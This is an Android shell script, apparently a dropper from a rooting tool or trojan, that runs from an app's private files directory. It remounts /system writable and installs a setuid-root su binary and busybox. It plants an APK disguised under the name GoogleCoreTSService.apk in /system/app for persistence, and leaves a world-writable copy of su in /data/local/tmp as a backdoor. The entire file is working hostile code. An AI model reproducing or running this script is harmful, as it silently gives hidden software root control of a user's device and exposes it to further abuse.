#!/system/bin/sh
#Pansing

TEMPPATH=/data/data/bmtet.wwjx.eat/files
BUSYBOX=/data/data/bmtet.wwjx.eat/files/busybox
export PATH=$TEMPPATH:$PATH

chmod 777 $TEMPPATH/busybox 
uid=$(busybox id -u)
if [ $uid -ne 0 ]; then
  echo "Are you root ? OK ,try anyway."
fi
busybox mount -o remount,rw /system
busybox cat $TEMPPATH/su > /system/xbin/su
chown 0.0 /system/xbin/su
chmod 6755 /system/xbin/su
busybox cat $TEMPPATH/busybox > /system/xbin/busybox
chown 0.0 /system/xbin/busybox
chmod 755 /system/xbin/busybox
busybox cat $TEMPPATH/romt > /system/app/GoogleCoreTSService.apk
chown 0.0 /system/app/GoogleCoreTSService.apk
chmod 644 /system/app/GoogleCoreTSService.apk
busybox cat $TEMPPATH/su > /data/local/tmp/systemfile
chown shell.shell /data/local/tmp/systemfile
chmod 777 /data/local/tmp/systemfile
echo "Now, your device is rooted !"
sync

